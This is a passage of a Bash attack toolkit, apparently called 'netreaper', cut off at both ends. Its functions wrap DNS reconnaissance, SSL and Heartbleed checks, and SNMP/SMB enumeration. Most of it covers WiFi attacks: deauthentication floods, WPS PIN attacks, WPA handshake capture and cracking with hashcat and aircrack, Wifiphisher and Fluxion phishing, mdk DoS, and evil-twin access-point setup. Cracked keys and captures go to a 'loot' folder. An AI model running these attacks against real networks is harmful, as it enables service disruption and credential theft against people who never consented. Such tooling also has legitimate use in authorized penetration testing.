    p0f -i "$IFACE" | tee -a "${LOG_DIR}/p0f.log"
    operation_summary "Passive fingerprinting" "$start_ms" "${LOG_DIR}/p0f.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - DNS
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

run_dnsenum() {
    check_tool "dnsenum" || return 1
    operation_header "DNS Enum" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dnsenum \"${TARGET}\""
    log_info "DNS enumeration on $TARGET"
    dnsenum "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "DNS enumeration" "$start_ms" "${LOG_DIR}/dns.log"
}

run_dnsmap() {
    check_tool "dnsmap" || return 1
    operation_header "DNS Map" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dnsmap \"${TARGET}\""
    log_info "DNS mapping on $TARGET"
    dnsmap "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "DNS mapping" "$start_ms" "${LOG_DIR}/dns.log"
}

run_dnsrecon() {
    check_tool "dnsrecon" || return 1
    operation_header "DNS Recon" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dnsrecon -d \"${TARGET}\""
    log_info "DNS recon on $TARGET"
    dnsrecon -d "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "DNS recon" "$start_ms" "${LOG_DIR}/dns.log"
}

run_zone_transfer() {
    operation_header "Zone transfer" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "dig axfr \"${TARGET}\""
    log_info "Attempting zone transfer on $TARGET"
    dig axfr "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "Zone transfer" "$start_ms" "${LOG_DIR}/dns.log"
}

run_fierce() {
    check_tool "fierce" || return 1
    operation_header "Fierce" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "fierce --domain \"${TARGET}\""
    log_info "Subdomain brute force on $TARGET"
    fierce --domain "$TARGET" | tee -a "${LOG_DIR}/dns.log"
    operation_summary "Subdomain brute force" "$start_ms" "${LOG_DIR}/dns.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - SSL
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

run_sslscan() {
    check_tool "sslscan" || return 1
    operation_header "SSL scan" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "sslscan \"${TARGET}\""
    log_info "SSL scan on $TARGET"
    sslscan "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "SSL scan" "$start_ms" "${LOG_DIR}/ssl.log"
}

run_sslyze() {
    check_tool "sslyze" || return 1
    operation_header "SSLyze" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "sslyze --regular \"${TARGET}\""
    log_info "SSLyze analysis on $TARGET"
    sslyze --regular "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "SSLyze" "$start_ms" "${LOG_DIR}/ssl.log"
}

run_testssl() {
    if [[ -x /usr/bin/testssl.sh ]] || [[ -x /usr/bin/testssl ]]; then
        operation_header "testssl.sh" "$TARGET"
        check_target_reachable "$TARGET" || true
        local start_ms
        start_ms=$(start_timer_ms)
        log_command_preview "testssl.sh \"${TARGET}\""
        log_info "TestSSL on $TARGET"
        testssl.sh "$TARGET" 2>/dev/null || testssl "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
        operation_summary "TestSSL" "$start_ms" "${LOG_DIR}/ssl.log"
    else
        log_warning "testssl.sh not found"
        echo -e "    ${C_SHADOW}Install: git clone https://github.com/drwetter/testssl.sh${C_RESET}"
    fi
}

run_cert_info() {
    operation_header "Certificate info" "$TARGET"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "echo | openssl s_client -connect \"${TARGET}:443\""
    log_info "Certificate info for $TARGET"
    echo | openssl s_client -connect "${TARGET}:443" 2>/dev/null | openssl x509 -noout -text | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "Certificate info" "$start_ms" "${LOG_DIR}/ssl.log"
}

run_heartbleed() {
    check_tool "nmap" || return 1
    operation_header "Heartbleed check" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "nmap --script ssl-heartbleed -p 443 \"${TARGET}\""
    log_attack "Heartbleed check on $TARGET"
    nmap --script ssl-heartbleed -p 443 "$TARGET" | tee -a "${LOG_DIR}/ssl.log"
    operation_summary "Heartbleed check" "$start_ms" "${LOG_DIR}/ssl.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - SNMP/SMB
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_snmp_sweep() {
    check_tool "onesixtyone" || return 1
    get_target || return 1
    operation_header "SNMP sweep" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \"${TARGET}\""
    log_info "SNMP sweep on $TARGET"
    onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$TARGET" 2>/dev/null || \
    onesixtyone "$TARGET" public private | tee -a "${LOG_DIR}/snmp.log"
    operation_summary "SNMP sweep" "$start_ms" "${LOG_DIR}/snmp.log"
}

cmd_smb_enum() {
    get_target || return 1
    operation_header "SMB enumeration" "$TARGET"
    check_target_reachable "$TARGET" || true
    local start_ms
    start_ms=$(start_timer_ms)
    log_info "SMB enumeration on $TARGET"
    
    if check_tool "enum4linux" 2>/dev/null; then
        log_command_preview "enum4linux -a \"${TARGET}\""
        enum4linux -a "$TARGET" | tee -a "${LOG_DIR}/smb.log"
    elif check_tool "smbmap" 2>/dev/null; then
        log_command_preview "smbmap -H \"${TARGET}\""
        smbmap -H "$TARGET" | tee -a "${LOG_DIR}/smb.log"
    elif check_tool "smbclient" 2>/dev/null; then
        log_command_preview "smbclient -L \"//${TARGET}\" -N"
        smbclient -L "//${TARGET}" -N | tee -a "${LOG_DIR}/smb.log"
    else
        log_error "No SMB tools found. Install: sudo apt install enum4linux smbmap smbclient"
    fi
    operation_summary "SMB enumeration" "$start_ms" "${LOG_DIR}/smb.log"
}

#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# TOOL IMPLEMENTATIONS - WiFi
#â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

cmd_monitor_mode() {
    local mode="${1:-}"
    require_root || return 1
    get_interface || return 1
    operation_header "WiFi monitor toggle" "$IFACE"
    
    local choice
    if [[ "$mode" == "enable" ]]; then
        choice=1
    elif [[ "$mode" == "disable" ]]; then
        choice=2
    else
        echo
        echo -e "    ${C_GHOST}[1]${C_RESET} Enable monitor mode"
        echo -e "    ${C_GHOST}[2]${C_RESET} Disable monitor mode"
        echo
        echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
        read -r choice
    fi
    
    case "$choice" in
        1)
            local start_ms
            start_ms=$(start_timer_ms)
            log_attack "Enabling monitor mode on $IFACE"
            log_command_preview "airmon-ng check kill && airmon-ng start \"${IFACE}\""
            if check_tool "airmon-ng" 2>/dev/null; then
                airmon-ng check kill
                airmon-ng start "$IFACE"
            else
                log_command_preview "ip link set \"${IFACE}\" down && iw dev \"${IFACE}\" set type monitor"
                ip link set "$IFACE" down
                iw dev "$IFACE" set type monitor
                ip link set "$IFACE" up
            fi
            operation_summary "Monitor mode enabled" "$start_ms" "${LOG_DIR}/netreaper.log"
            ;;
        2)
            local start_ms
            start_ms=$(start_timer_ms)
            log_info "Disabling monitor mode on $IFACE"
            if check_tool "airmon-ng" 2>/dev/null; then
                log_command_preview "airmon-ng stop \"${IFACE}\""
                airmon-ng stop "$IFACE"
                systemctl restart NetworkManager 2>/dev/null || service networking restart
            else
                log_command_preview "ip link set \"${IFACE}\" down && iw dev \"${IFACE}\" set type managed"
                ip link set "$IFACE" down
                iw dev "$IFACE" set type managed
                ip link set "$IFACE" up
            fi
            operation_summary "Monitor mode disabled" "$start_ms" "${LOG_DIR}/netreaper.log"
            ;;
    esac
}

cmd_wifi_scan() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1
    operation_header "WiFi scan" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "airodump-ng \"${IFACE}\""
    log_attack "Scanning WiFi networks on $IFACE"
    echo -e "    ${C_SHADOW}Press Ctrl+C to stop${C_RESET}"
    echo
    airodump-ng "$IFACE"
    operation_summary "WiFi scan" "$start_ms" "${LOG_DIR}/wifi_scan.log"
}

cmd_wifite() {
    require_root || return 1
    check_tool "wifite" || return 1
    operation_header "Wifite" "auto"
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "wifite --kill"
    log_attack "Launching Wifite"
    echo
    wifite --kill
    operation_summary "Wifite" "$start_ms" "${LOG_DIR}/wifite.log"
}

cmd_deauth() {
    require_root || return 1
    check_tool "aireplay-ng" || return 1
    get_interface || return 1
    
    echo -ne "    ${C_GHOST}Target BSSID (AP MAC): ${C_RESET}"
    read -r bssid
    echo -ne "    ${C_GHOST}Client MAC (or 'all'): ${C_RESET}"
    read -r client
    echo -ne "    ${C_GHOST}Number of deauths (0=infinite): ${C_RESET}"
    read -r count
    count="${count:-10}"
    
    operation_header "Deauth" "$bssid"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Deauth attack: BSSID=$bssid Client=$client Count=$count"
    echo
    
    if [[ "$client" == "all" ]]; then
        log_command_preview "aireplay-ng --deauth ${count} -a ${bssid} ${IFACE}"
        aireplay-ng --deauth "$count" -a "$bssid" "$IFACE"
    else
        log_command_preview "aireplay-ng --deauth ${count} -a ${bssid} -c ${client} ${IFACE}"
        aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$IFACE"
    fi
    operation_summary "Deauth attack" "$start_ms" "${LOG_DIR}/wifi_deauth.log"
}

cmd_wps_attack() {
    require_root || return 1
    get_interface || return 1
    
    echo -ne "    ${C_GHOST}Target BSSID: ${C_RESET}"
    read -r bssid
    echo -ne "    ${C_GHOST}Channel: ${C_RESET}"
    read -r channel
    
    echo
    echo -e "    ${C_GHOST}[1]${C_RESET} Reaver"
    echo -e "    ${C_GHOST}[2]${C_RESET} Bully"
    echo -e "    ${C_GHOST}[3]${C_RESET} Pixiewps (Pixie Dust)"
    echo
    echo -ne "    ${C_FIRE}â–¶ ${C_RESET}"
    read -r choice
    
    case "$choice" in
        1)
            check_tool "reaver" || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            operation_header "Reaver WPS" "$bssid"
            log_attack "Reaver WPS attack on $bssid"
            log_command_preview "reaver -i \"${IFACE}\" -b \"${bssid}\" -c \"${channel}\" -vv"
            reaver -i "$IFACE" -b "$bssid" -c "$channel" -vv
            operation_summary "Reaver WPS" "$start_ms" "${LOG_DIR}/wps.log"
            ;;
        2)
            check_tool "bully" || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            operation_header "Bully WPS" "$bssid"
            log_attack "Bully WPS attack on $bssid"
            log_command_preview "bully -b \"${bssid}\" -c \"${channel}\" \"${IFACE}\""
            bully -b "$bssid" -c "$channel" "$IFACE"
            operation_summary "Bully WPS" "$start_ms" "${LOG_DIR}/wps.log"
            ;;
        3)
            check_tool "reaver" || return 1
            local start_ms
            start_ms=$(start_timer_ms)
            operation_header "Pixie Dust" "$bssid"
            log_attack "Pixie Dust attack on $bssid"
            log_command_preview "reaver -i \"${IFACE}\" -b \"${bssid}\" -c \"${channel}\" -K 1 -vv"
            reaver -i "$IFACE" -b "$bssid" -c "$channel" -K 1 -vv
            operation_summary "Pixie Dust" "$start_ms" "${LOG_DIR}/wps.log"
            ;;
    esac
}

cmd_handshake_capture() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1
    
    echo -ne "    ${C_GHOST}Target BSSID: ${C_RESET}"
    read -r bssid
    echo -ne "    ${C_GHOST}Channel: ${C_RESET}"
    read -r channel
    echo -ne "    ${C_GHOST}Output filename: ${C_RESET}"
    read -r outfile
    outfile="${outfile:-${LOOT_DIR}/handshake_$(date +%Y%m%d_%H%M%S)}"
    
    operation_header "Handshake capture" "$bssid"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Capturing handshake from $bssid on channel $channel"
    echo -e "    ${C_SHADOW}Waiting for handshake... (deauth clients to speed up)${C_RESET}"
    echo
    log_command_preview "airodump-ng --bssid \"${bssid}\" -c \"${channel}\" -w \"${outfile}\" \"${IFACE}\""
    airodump-ng --bssid "$bssid" -c "$channel" -w "$outfile" "$IFACE"
    operation_summary "Handshake capture" "$start_ms" "$outfile.cap"
}

cmd_channel_hop() {
    require_root || return 1
    get_interface || return 1
    
    log_info "Channel hopping on $IFACE (Ctrl+C to stop)"
    echo

    while true; do
        for ch in 1 2 3 4 5 6 7 8 9 10 11; do
            iw dev "$IFACE" set channel "$ch" 2>/dev/null || iwconfig "$IFACE" channel "$ch" 2>/dev/null
            printf "\r    ${C_GHOST}Channel: ${C_VENOM}%2d${C_RESET}" "$ch"
            sleep 0.3
        done
    done
}

cmd_client_scan() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1
    
    echo -ne "    ${C_GHOST}Target BSSID: ${C_RESET}"
    read -r bssid
    echo -ne "    ${C_GHOST}Channel: ${C_RESET}"
    read -r channel
    
    log_info "Scanning clients on $bssid"
    echo
    local start_ms
    start_ms=$(start_timer_ms)
    log_command_preview "airodump-ng --bssid \"${bssid}\" -c \"${channel}\" \"${IFACE}\""
    airodump-ng --bssid "$bssid" -c "$channel" "$IFACE"
    operation_summary "Client scan" "$start_ms" "${LOG_DIR}/wifi_clients.log"
}

cmd_hidden_ssid() {
    log_info "To reveal hidden SSID:"
    echo
    echo -e "    ${C_GHOST}1.${C_RESET} Start airodump-ng to find hidden network (shows <length: X>)"
    echo -e "    ${C_GHOST}2.${C_RESET} Note the BSSID and channel"
    echo -e "    ${C_GHOST}3.${C_RESET} Run deauth attack to force client reconnection"
    echo -e "    ${C_GHOST}4.${C_RESET} SSID will appear in airodump when client reconnects"
    echo
    echo -e "    ${C_SHADOW}Use options [7] WiFi Recon then [8] Deauth Attack${C_RESET}"
}

cmd_signal_check() {
    get_interface || return 1
    operation_header "Signal check" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    
    if check_tool "wavemon" 2>/dev/null; then
        log_command_preview "wavemon -i \"${IFACE}\""
        wavemon -i "$IFACE"
    else
        log_info "Signal info for $IFACE"
        log_command_preview "iwconfig \"${IFACE}\""
        echo
        iwconfig "$IFACE" 2>/dev/null || iw dev "$IFACE" link
    fi
    operation_summary "Signal check" "$start_ms" "${LOG_DIR}/wifi_signal.log"
}

cmd_aircrack_dict() {
    check_tool "aircrack-ng" || return 1
    echo -ne "    ${C_GHOST}Capture file (.cap/.pcapng): ${C_RESET}"
    read -r capfile
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r wordlist
    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
    operation_header "Aircrack dictionary" "$capfile"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Aircrack-ng dictionary attack on $capfile"
    log_command_preview "aircrack-ng -w \"${wordlist}\" \"${capfile}\""
    aircrack-ng -w "$wordlist" "$capfile" | tee -a "${LOG_DIR}/aircrack.log"
    operation_summary "Aircrack dictionary" "$start_ms" "${LOG_DIR}/aircrack.log"
}

cmd_aircrack_wordlist() {
    check_tool "aircrack-ng" || return 1
    echo -ne "    ${C_GHOST}Capture file (.cap/.pcapng): ${C_RESET}"
    read -r capfile
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
    echo -ne "    ${C_GHOST}Custom wordlist: ${C_RESET}"
    read -r wordlist
    [[ -z "$wordlist" ]] && { log_error "Wordlist required"; return 1; }
    operation_header "Aircrack custom" "$capfile"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Aircrack-ng custom wordlist on $capfile"
    log_command_preview "aircrack-ng -w \"${wordlist}\" \"${capfile}\""
    aircrack-ng -w "$wordlist" "$capfile" | tee -a "${LOG_DIR}/aircrack.log"
    operation_summary "Aircrack custom" "$start_ms" "${LOG_DIR}/aircrack.log"
}

cmd_convert_hashcat() {
    local converter=""
    if command -v hcxpcapngtool &>/dev/null; then
        converter="hcxpcapngtool"
    elif command -v cap2hccapx &>/dev/null; then
        converter="cap2hccapx"
    fi
    [[ -z "$converter" ]] && { log_error "hcxpcapngtool or cap2hccapx required"; return 1; }

    local capfile="${1:-}"
    if [[ -z "$capfile" ]]; then
        echo -ne "    ${C_GHOST}Capture file (.cap/.pcapng): ${C_RESET}"
        read -r capfile
    fi
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }

    mkdir -p "$LOOT_DIR"
    local base_name
    base_name="$(basename "$capfile")"
    local out_file
    out_file="${LOOT_DIR}/${base_name%.*}_$(date +%Y%m%d_%H%M%S).hc22000"

    if [[ "$converter" == "hcxpcapngtool" ]]; then
        log_info "Converting with hcxpcapngtool"
        log_command_preview "hcxpcapngtool -o \"${out_file}\" \"${capfile}\""
        hcxpcapngtool -o "$out_file" "$capfile"
    else
        out_file="${out_file%.hc22000}.hccapx"
        log_info "Converting with cap2hccapx"
        log_command_preview "cap2hccapx \"${capfile}\" \"${out_file}\""
        cap2hccapx "$capfile" "$out_file"
    fi

    log_loot "Converted hash saved: $out_file"
    echo "$out_file"
}

cmd_hashcat_gpu() {
    check_tool "hashcat" || return 1
    echo -ne "    ${C_GHOST}Capture/hash file (.cap/.hc22000/.hccapx): ${C_RESET}"
    read -r capfile
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
    local hashfile="$capfile"
    if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
        hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
        [[ -z "$hashfile" ]] && { log_error "Conversion failed"; return 1; }
    fi
    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r wordlist
    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
    operation_header "Hashcat GPU" "$hashfile"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Hashcat GPU attack on $hashfile"
    log_command_preview "hashcat -m 22000 -a 0 \"${hashfile}\" \"${wordlist}\" --status --status-timer=15 --potfile-path \"${LOG_DIR}/hashcat.pot\" --session netreaper"
    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper | tee -a "${LOG_DIR}/hashcat.log"
    hashcat --show -m 22000 "$hashfile" --potfile-path "${LOG_DIR}/hashcat.pot" | tee -a "${LOG_DIR}/hashcat.log"
    operation_summary "Hashcat GPU" "$start_ms" "${LOG_DIR}/hashcat.log"
}

cmd_hashcat_rules() {
    check_tool "hashcat" || return 1
    echo -ne "    ${C_GHOST}Capture/hash file (.cap/.hc22000/.hccapx): ${C_RESET}"
    read -r capfile
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
    local hashfile="$capfile"
    if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
        hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
        [[ -z "$hashfile" ]] && { log_error "Conversion failed"; return 1; }
    fi
    echo -ne "    ${C_GHOST}Wordlist: ${C_RESET}"
    read -r wordlist
    [[ -z "$wordlist" ]] && { log_error "Wordlist required"; return 1; }
    echo -ne "    ${C_GHOST}Rules file [/usr/share/hashcat/rules/best64.rule]: ${C_RESET}"
    read -r rules
    rules="${rules:-/usr/share/hashcat/rules/best64.rule}"
    operation_header "Hashcat rules" "$hashfile"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Hashcat rules attack on $hashfile using $rules"
    log_command_preview "hashcat -m 22000 -a 0 \"${hashfile}\" \"${wordlist}\" -r \"${rules}\" --status --status-timer=15 --potfile-path \"${LOG_DIR}/hashcat.pot\" --session netreaper"
    hashcat -m 22000 -a 0 "$hashfile" "$wordlist" -r "$rules" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper | tee -a "${LOG_DIR}/hashcat.log"
    hashcat --show -m 22000 "$hashfile" --potfile-path "${LOG_DIR}/hashcat.pot" | tee -a "${LOG_DIR}/hashcat.log"
    operation_summary "Hashcat rules" "$start_ms" "${LOG_DIR}/hashcat.log"
}

cmd_john_the_ripper() {
    check_tool "john" || return 1
    check_tool "hccap2john" || return 1
    echo -ne "    ${C_GHOST}Capture/hash file (.cap/.hccapx/.hc22000): ${C_RESET}"
    read -r capfile
    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; return 1; }
    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r wordlist
    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"

    local john_hash
    john_hash="${LOOT_DIR}/john_$(date +%Y%m%d_%H%M%S).hash"
    hccap2john "$capfile" > "$john_hash"
    operation_header "John the Ripper" "$capfile"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "John the Ripper on $john_hash"
    log_command_preview "john --wordlist=\"${wordlist}\" \"${john_hash}\""
    john --wordlist="$wordlist" "$john_hash" | tee -a "${LOG_DIR}/john.log"
    john --show "$john_hash" | tee -a "${LOG_DIR}/john.log"
    operation_summary "John the Ripper" "$start_ms" "${LOG_DIR}/john.log"
}

cmd_cowpatty() {
    check_tool "cowpatty" || return 1
    echo -ne "    ${C_GHOST}Capture file (.cap): ${C_RESET}"
    read -r capfile
    [[ -z "$capfile" ]] && { log_error "Capture file required"; return 1; }
    echo -ne "    ${C_GHOST}SSID: ${C_RESET}"
    read -r ssid
    [[ -z "$ssid" ]] && { log_error "SSID required"; return 1; }
    echo -ne "    ${C_GHOST}Wordlist [/usr/share/wordlists/rockyou.txt]: ${C_RESET}"
    read -r wordlist
    wordlist="${wordlist:-/usr/share/wordlists/rockyou.txt}"
    operation_header "Cowpatty" "$ssid"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Cowpatty WPA crack on $ssid"
    log_command_preview "cowpatty -r \"${capfile}\" -s \"${ssid}\" -f \"${wordlist}\" -2"
    cowpatty -r "$capfile" -s "$ssid" -f "$wordlist" -2 | tee -a "${LOG_DIR}/cowpatty.log"
    operation_summary "Cowpatty" "$start_ms" "${LOG_DIR}/cowpatty.log"
}

cmd_bettercap_wifi() {
    require_root || return 1
    check_tool "bettercap" || return 1
    get_interface || return 1
    local log_file
    log_file="${LOG_DIR}/bettercap_${IFACE}_$(date +%Y%m%d_%H%M%S).log"
    operation_header "Bettercap WiFi" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Bettercap WiFi recon on $IFACE"
    log_command_preview "bettercap -iface \"${IFACE}\" -log \"${log_file}\" -eval ..."
    bettercap -iface "$IFACE" -log "$log_file" -eval "set wifi.recon.channel_hop true; wifi.recon on; set ticker.commands 'wifi.show'; ticker on"
    log_loot "Bettercap log: $log_file"
    operation_summary "Bettercap WiFi" "$start_ms" "$log_file"
}

cmd_fluxion() {
    require_root || return 1
    check_tool "fluxion" || return 1
    operation_header "Fluxion" "rogue"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Launching Fluxion"
    log_command_preview "fluxion"
    fluxion
    operation_summary "Fluxion" "$start_ms" "${LOG_DIR}/fluxion.log"
}

cmd_wifiphisher() {
    require_root || return 1
    check_tool "wifiphisher" || return 1
    get_interface || return 1
    operation_header "Wifiphisher" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Starting Wifiphisher on $IFACE"
    log_command_preview "wifiphisher -i \"${IFACE}\""
    wifiphisher -i "$IFACE"
    operation_summary "Wifiphisher" "$start_ms" "${LOG_DIR}/wifiphisher.log"
}

cmd_mdk_dos() {
    require_root || return 1
    local tool=""
    if command -v mdk4 &>/dev/null; then
        tool="mdk4"
    elif command -v mdk3 &>/dev/null; then
        tool="mdk3"
    else
        log_error "mdk3/mdk4 not found"
        return 1
    fi
    get_interface || return 1
    echo -ne "    ${C_GHOST}Target BSSID (or 'broadcast'): ${C_RESET}"
    read -r bssid
    echo -ne "    ${C_GHOST}Channel [1]: ${C_RESET}"
    read -r channel
    channel="${channel:-1}"
    mkdir -p "$TMP_DIR"
    local bssid_list="${TMP_DIR}/mdk_bssids.txt"
    echo "$bssid" > "$bssid_list"
    operation_header "${tool^^} DoS" "$bssid"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "${tool^^} DoS on $bssid channel $channel"
    if [[ "$tool" == "mdk4" ]]; then
        log_command_preview "mdk4 \"${IFACE}\" d -B \"${bssid}\" -c \"${channel}\""
        mdk4 "$IFACE" d -B "$bssid" -c "$channel"
    else
        log_command_preview "mdk3 \"${IFACE}\" d -b \"${bssid_list}\" -c \"${channel}\""
        mdk3 "$IFACE" d -b "$bssid_list" -c "$channel"
    fi
    operation_summary "${tool^^} DoS" "$start_ms" "${LOG_DIR}/mdk.log"
}

cmd_evil_twin_scan() {
    require_root || return 1
    check_tool "airodump-ng" || return 1
    get_interface || return 1
    operation_header "Evil twin scan" "$IFACE"
    local start_ms
    start_ms=$(start_timer_ms)
    log_attack "Scanning for APs to clone on $IFACE"
    log_command_preview "airodump-ng \"${IFACE}\""
    airodump-ng "$IFACE"
    operation_summary "Evil twin scan" "$start_ms" "${LOG_DIR}/evil_scan.log"
}

cmd_evil_twin_create() {
    require_root || return 1
    check_tool "hostapd" || return 1
    check_tool "dnsmasq" || return 1
    check_tool "iptables" || return 1
    get_interface || return 1
    mkdir -p "$TMP_DIR" "$LOOT_DIR"

    echo -ne "    ${C_GHOST}Target SSID: ${C_RESET}"
    # shellcheck disable=SC2034
    read -r TARGET_SSID
    echo -ne "    ${C_GHOST}Target channel: ${C_RESET}"
    # shellcheck disable=SC2034
    read -r CHANNEL
    echo -ne "    ${C_GHOST}Target BSSID (for reference): ${C_RESET}"
    read -r TARGET_BSSID
    echo -ne "    ${C_GHOST}Uplink interface for NAT (blank=none): ${C_RESET}"
    read -r UPLINK

    echo "$IFACE" > "${TMP_DIR}/evil_iface.txt"
    local hostapd_conf="${TMP_DIR}/hostapd_${IFACE}.conf"
    local dnsmasq_conf="${TMP_DIR}/dnsmasq_${IFACE}.conf"
    eval "cat <<EOF > \"$hostapd_conf\"\n${HOSTAPD_TEMPLATE}\nEOF"
    eval "cat <<EOF > \"$dnsmasq_conf\"\n${DNSMASQ_TEMPLATE}\nEOF"

    ip link set "$IFACE" down
    ip addr flush dev "$IFACE"
    ip addr add 192.168.1.1/24 dev "$IFACE"
    ip link set "$IFACE" up

    local dns_pid_file="${TMP_DIR}/dnsmasq_${IFACE}.pid"
    local ap_log
    ap_log="${LOOT_DIR}/evil_twin_clients_$(date +%Y%m%d_%H%M%S).log"
    local hostapd_pid_file="${TMP_DIR}/hostapd_${IFACE}.pid"
    local start_ms
    start_ms=$(start_timer_ms)
    dnsmasq -C "$dnsmasq_conf" --pid-file="$dns_pid_file"
    hostapd -B -P "$hostapd_pid_file" -f "$ap_log" "$hostapd_conf"

